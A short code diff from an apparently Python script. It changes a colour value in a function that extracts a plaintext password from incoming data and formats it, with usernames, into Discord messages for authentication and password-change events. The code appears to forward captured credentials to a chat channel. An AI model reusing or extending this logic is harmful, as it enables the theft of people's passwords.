@@ -22,7 +22,7 @@ def send_discord(addr, data):
     password = data.split("-")[1].split(":")[2].strip()
 
     fields = []
-    color = "#000000"
+    color = 0
     if (message == "USER AUTHENTICATED" or message == "USER CHANGED PASSWORD"):
         fields.append({
             'name': "Username",
